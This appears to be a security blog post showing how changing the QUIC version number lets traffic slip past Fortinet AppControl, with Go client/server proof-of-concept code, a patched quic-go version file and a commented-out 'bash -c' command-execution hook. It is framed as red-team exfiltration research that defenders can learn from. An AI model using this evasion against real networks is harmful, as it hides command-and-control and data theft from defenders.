---
layout: post
title: "Evade IDS/IPS With QUIC Protocol"
date:   2019-08-27
---

![img](https://media.giphy.com/media/IeKgCDlpTqRQbZEhBF/giphy.gif)


QUIC is a new protocol created by Google to make the web faster and more efficient. It is enabled by default in Chromium and used by a growth list of sites. And because of its growth, it can also pose a threat to the companies, because the RFC of the protocol is still in the draft phase by IETF, lack documentation and understanding about it to inspect and block its traffic, facilitating protocol abuse by attackers.


## Indice
1. [Quic Protocol](#quic_protocol)

	1.1 [QUIC Impacts Network Security and Reporting](#seg_quic)

	1.2 [Versioning of QUIC](#versao_quic)

2. [Research Objective](#objetivo_da_pesquisa)

	2.1 [Proof of Concept](#poc)

	2.2 [Proof Of Concept Video](#poc_video)

## QUIC protocol<a name="quic_protocol"></a>

Based on UDP, acronym comes from the "_Quick UDP Internet Connections_" (**QUIC**). The idea is basically to unite the benefits of TCP with UDP speed, since QUIC can negotiate communication (including security) parameters more quickly. In theory, QUIC uses the transport layer of UDP with HTTP / 2 as shown in figure 1.

```
+--------------+      +--------------+
|    HTTP/2    |      |    HTTP/2    |
| -Multistream |      +--------------+
+--------------+      +--------------+
+--------------+      |     QUIC     |
|     TLS      |      |              |
| -Encrypted   |      | -Multistream |
|   Payload    |      |              |
+--------------+      | -Encryption  |
+--------------+      |              |
|     TCP      |      | -Congestion  |
| -Congestion  |      |  Control     |
|  Control     |      |              |
|              |      | -Reliable    |
| -Reliable    |      |  Data Stream |
|  Data Stream |      +--------------+
|              |      +--------------+
|              |      |     UDP      |
+--------------+      +--------------+
+------------------------------------+
|                 IP                 |
+------------------------------------+
```
_**figure 1**_

### QUIC Impacts Network Security and Reporting<a name="seg_quic"></a>

Unlike the TCP protocol, QUIC requires 0-RTT in the handshake compared to 1-3 roundtrip TCP + TLS trips. This ensures security for anyone using the protocol, but invalidate possibilities a man-in-the-middle attack why inspection mechanism don't support QUIC Protocol. In most architectures, when HTTP traffic is detected, it is passed to a Web protection module that performs filtering, deep inspection of packages, and so on.

### Versioning of Quic<a name="versao_quic"></a>

The versioning of the protocol is an important factor for this research, since we noticed that currently the identification through the Fortinet appcontrol is done by the **version** of the protocol.

For a better understanding, the structure of the QUIC and the diagram of the Public Header is show below.

**QUIC Structure:**

```
                   +------------------------------------------+ <--+  UDP Packet
              +--> |             UDP Packet                   |    |
Unecrypted    |    +---------------------------------------+  |    | <--+ QUIC Packet
Authenticated +--> |             QUIC Public header        |  |    |    |
                   +---------------------------------------+  |    |    |
              +--> |             AEAD Data                 |  |    |    |
Encrypted     |    | +-----------------------------------+ |  |    |    |
Authenticated |    | |           QUIC Private header     | |  |    |    |
              |    | +-----------------------------------+ |  |    |    | <--+ QUIC Frame Packet
              |    | |           QUIC Frame Packet       | |  |    |    |    |
              |    | |   +-------------------------------+ |  |    |    |    | <--+ Frame
              |    | |   |       QUIC Frame 1            | |  |    |    |    |    |
              |    | |   +-------------------------------+ |  |    |    |    | <--+ Frame
              |    | |   |       QUIC Frame 2            | |  |    |    |    |    |
              |    | |   +-------------------------------+ |  |    |    |    | <--+ Frame
              |    | |   |       QUIC Frame n            | |  |    |    |    |    |
              +--> +-+---+-------------------------------+-+--+ <--+ <--+ <--+ <--+

```

**Public Header Diagram:**

```
+--------------+-----------------------+
| Public Flags |     Connection ID     |
+--------------+-----------------------+
|             QUIC Version             |
+--------------------------------------+
|        Diversification noance        |
+--------------------------------------+
|             Packet Number            |
+--------------------------------------+

```


The QUIC specification reserves from 0x00000001 to 0x0000ffff for standardized versions of the protocol as shown in the table below:

| Version | Owner | Notes |
|---------|-------|-------|
| 0x00000000 | n/a | This value is reserved as invalid |
| 0x?a?a?a?a | IETF | Values meeting this pattern ((x&0x0f0f0f0f)==0x0a0a0a0a) are reserved for ensuring that version negotiation remains viable.  Endpoints SHOULD use these values.  Endpoints can expect that these versions will not be accepted by their peer. |
| 0x50435130     | Private Octopus | Picoquic internal test version |
| 0x5130303[1-9] | Google | Google QUIC 01 - 09 (Q001 - Q009) |
| 0x5130313[0-9] | Google | Google QUIC 10 - 19 (Q010 - Q019) |
| 0x5130323[0-9] | Google | Google QUIC 20 - 29 (Q020 - Q029) |
| 0x5130333[0-9] | Google | Google QUIC 30 - 39 (Q030 - Q039) |
| 0x5130343[0-9] | Google | Google QUIC 40 - 49 (Q040 - Q049) |
| 0x51474f[0-255] | quic-go | "QGO" + [0-255]
| 0x91c170[0-255] | quicly | "qicly0" + [0-255] |
| 0xabcd000[0-f] | Microsoft | WinQuic |
| 0xf10000[00-ff] | IETF | QUIC-LB |
| 0xf123f0c[0-f] | Mozilla | MozQuic |
| 0xfaceb00[0-f] | Facebook | mvfst |
| 0xff000001 | IETF | draft-ietf-quic-transport-01 |
| 0xff000002 | IETF | draft-ietf-quic-transport-02 |
| 0xff000003 | IETF | draft-ietf-quic-transport-03 |
| 0xff000004 | IETF | draft-ietf-quic-transport-04 |
| 0xff000005 | IETF | draft-ietf-quic-transport-05 |
| 0xff000006 | IETF | draft-ietf-quic-transport-06 |
| 0xff000007 | IETF | draft-ietf-quic-transport-07 |
| 0xff000008 | IETF | draft-ietf-quic-transport-08 |
| 0xff000009 | IETF | draft-ietf-quic-transport-09 |
| 0xff00000a | IETF | draft-ietf-quic-transport-10 |
| 0xff00000b | IETF | draft-ietf-quic-transport-11 |
| 0xf0f0f0f[0-f] | ETH Zürich | Measurability experiments |


### Research objective<a name="objetivo_da_pesquisa"></a>

Because the QUIC transport stream does not allow Firewall to perform a deep packet inspection, there is an impact in both reporting and network security that allows attackers to abuse the protocol and avoid detection of malicious actions just changing the **version** in the public header.

It is known that the current deficiency of IDS / IPS in interpreting a connection using the QUIC protocol with the altered version ***(as seen above in "[Versioning of QUIC](#versao_quic)")***, we develop exfiltration techniques for the Redteam avoid detection and even if they could be identified, I would not raise suspicious in the actions, due to trafic encryption. And develop means of blocking and detecting this technique for Blueteam/SOC team that could identify any version changes, making it easier to identify and block effectively, regardless of the protocol version used.

At the time this research is written, the only stable implementation outside Chromium his the protocol is in GO Lang, written by [Lucas Clemente](https://github.com/lucas-clemente). Using this implementation for the tests, a client/server was made to understand and carry out the evasion of the IDS/IPS with the use of different versions of the QUIC protocol. During the action phase of the redteam, we used a C2 that works with this protocol called [Merlin](https://github.com/Ne0nd0g/merlin) made by [Ne0nd0g](https://github.com/Ne0nd0g), but for this paper, we will only address the implementation of Lucas Clemente to demonstrate how to pass the traffic even with the blocking of QUIC by appcontrol, which can also be implemented in [Merlin](https://github.com/Ne0nd0g/merlin) by using [quic-go](https://github.com/lucas-clemente/quic-go).


#### Proof of Concept<a name="poc"></a>

During the tests we used a Fortinet, the AppControl of the apliance identifies the QUIC protocol in traffic using the standard version of Google:

| Version |  Owner | Notes |
|---------|-------|-------|
| 0x5130303[1-9] | Google | Google QUIC 01 - 09 (Q001 - Q009) |
| 0x5130313[0-9] | Google | Google QUIC 10 - 19 (Q010 - Q019) |
| 0x5130323[0-9] | Google | Google QUIC 20 - 29 (Q020 - Q029) |
| 0x5130333[0-9] | Google | Google QUIC 30 - 39 (Q030 - Q039<a name="Q039"></a>) |
| 0x5130343[0-9] | Google | Google QUIC 40 - 49 (Q040 - Q049) |

For proof of concept, we have the client/server code and we made some changes in [quic-go](https://github.com/lucas-clemente/quic-go) to change the version that the server and client would accept.

**Server:**
```go
package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"time"
	"net/http"
	"github.com/lucas-clemente/quic-go/h2quic"
	"github.com/lucas-clemente/quic-go/internal/protocol"
	quic "github.com/lucas-clemente/quic-go"
)


type Page struct {
	Title string
	Body  []byte
}

func (p *Page) save() error {
	filename := p.Title + ".txt"
	return ioutil.WriteFile(filename, p.Body, 0600)
}

func loadPage(title string) (*Page, error) {
	filename := title + ".txt"
	body, err := ioutil.ReadFile(filename)
	if err != nil {
		return nil, err
	}
	return &Page{Title: title, Body: body}, nil
}

func viewHandler(w http.ResponseWriter, r *http.Request) {
	title := r.URL.Path[len("/view/"):]
	p, _ := loadPage(title)
	fmt.Fprintf(w, "<h1>%s</h1><div>%s</div>", p.Title, p.Body)
}

func main() {
        versions := protocol.SupportedVersions
        http.HandleFunc("/view/", viewHandler)
	server := h2quic.Server{
		Server:     &http.Server{Addr: ":443"},
                QuicConfig: &quic.Config{Versions: versions, IdleTimeout: 30000 * time.Millisecond},
        }
	log.Fatal(server.ListenAndServeTLS("fullchain.pem", "privkey.pem"))
}

```

**Client:**

```go
package main

import (
	"bytes"
	"flag"
	"io"
	"net/http"
	"fmt"
//	"os/exec"
	"time"

	quic "github.com/lucas-clemente/quic-go"
	"github.com/lucas-clemente/quic-go/h2quic"
	"github.com/lucas-clemente/quic-go/internal/protocol"
)

/*func execCommand(cmd string) []byte {
        output, err := exec.Command("bash", "-c", cmd).Output()
        if err != nil {
		fmt.Println(err)
        }
        fmt.Println(output)
	return output
}*/

func main() {
	urls := flag.String("url", "https://127.0.0.1:443/", "URL")
	flag.Parse()

	versions := protocol.SupportedVersions
	roundTripper := &h2quic.RoundTripper{
		QuicConfig: &quic.Config{Versions: versions, IdleTimeout: 30000 * time.Millisecond},
	}
	defer roundTripper.Close()
	hclient := &http.Client{
		Transport: roundTripper,
	}

	rsp, err := hclient.Get(*urls)
	rsp.Header.Add("User-Agent", "UnkL4b")
	if err != nil {
		panic(err)
	}

	body := &bytes.Buffer{}
	_, err = io.Copy(body, rsp.Body)
	if err != nil {
		panic(err)
	}
	fmt.Printf("%s", body.Bytes())
}

```


To change the version, we only edit a few lines at the beginning of the file "**[version.go](https://github.com/lucas-clemente/quic-go/blob/master/internal/protocol/version.go)**", as we can see below the code already with the changes .

```go
package protocol

import (
        "crypto/rand"
        "encoding/binary"
        "fmt"
        "math"
)

// VersionNumber is a version number as int
type VersionNumber uint32

// gQUIC version range as defined in the wiki: https://github.com/quicwg/base-drafts/wiki/QUIC-Versions
const (
        gquicVersion0   = 0x51303030
        maxGquicVersion = 0x51303439
)

// The version numbers, making grepping easier
const (
        Version39       VersionNumber = gquicVersion0 + 3*0x100 + 0x9
        Version43       VersionNumber = gquicVersion0 + 4*0x100 + 0x3
        Version44       VersionNumber = gquicVersion0 + 4*0x100 + 0x4
        VersionTLS      VersionNumber = 0x51474fff
        VersionUnk      VersionNumber = 0x66000666 + 4*0x100 + 0x4
        VersionWhatever VersionNumber = 0 // for when the version doesn't matter
        VersionUnknown  VersionNumber = math.MaxUint32
)

// SupportedVersions lists the versions that the server supports
// must be in sorted descending order
var SupportedVersions = []VersionNumber{VersionUnk}

```

The tests consist of blocking the QUIC protocol in Fortinet AppControl and running the client to close communication with a server in the cloud that is accepting only the protocol in the **[Q039](#Q039)** version, so it would not be possible to display the body of the page from web server. In a second moment, the version change was made on both server and client so that they have communication, keeping the QUIC blocked in the Fortinet AppControl.

#### Proof Of Concept Video<a name="poc_video"></a>

[![Quic Evade IDS/IPS](https://raw.githubusercontent.com/UnkL4b/unkl4b.github.io/master/img/Adobe_Post_20190402_172859.png)](https://www.youtube.com/watch?v=URnhU_vM2Os)

Below we can see the fortigate logs of the tests performed in the video, being the order from bottom up, where the first test was blocked and the second passed.

![Log-Video-Fortinet](https://raw.githubusercontent.com/UnkL4b/unkl4b.github.io/master/img/POC-VIDEO-2.png)

## Conclusion

I concluded that AppControl verifies versioning of the protocol and in some cases as in Wireshark, port 443 / UDP for correct identification of the QUIC. If any of these parameters are changed, the protocol is not identified. Signatures that try to identify specific parameters of a protocol without alerting the use of invalid values are extremely limited in efficiency, compromising traffic control.

## References

https://en.wikipedia.org/wiki/QUIC

https://tools.ietf.org/html/draft-pauly-quic-datagram-00

https://docs.google.com/document/d/1gY9-YNDNAB1eip-RTPbqphgySwSNSDHLq9D5Bty4FSU/edit

https://www.net.in.tum.de/fileadmin/TUM/NET/NET-2016-09-1/NET-2016-09-1_06.pdf

https://fortiguard.com/appcontrol/40169

https://github.com/lucas-clemente/quic-go

https://docs.google.com/document/d/1g5nIXAIkN_Y-7XJW5K45IblHd_L2f5LTaDUDwvZ5L6g/edit

https://docs.google.com/document/d/1WJvyZflAO2pq77yOLbp9NsGjC1CHetAXV8I0fQe-B_U/edit

https://static.googleusercontent.com/media/research.google.com/en//pubs/archive/46403.pdf

https://medium.com/@nirosh/understanding-quic-wire-protocol-d0ff97644de7

https://github.com/Ne0nd0g/merlin

https://github.com/quicwg/base-drafts/wiki/QUIC-Versions

https://www.fastvue.co/fastvue/blog/googles-quic-protocols-security-and-reporting-implications/
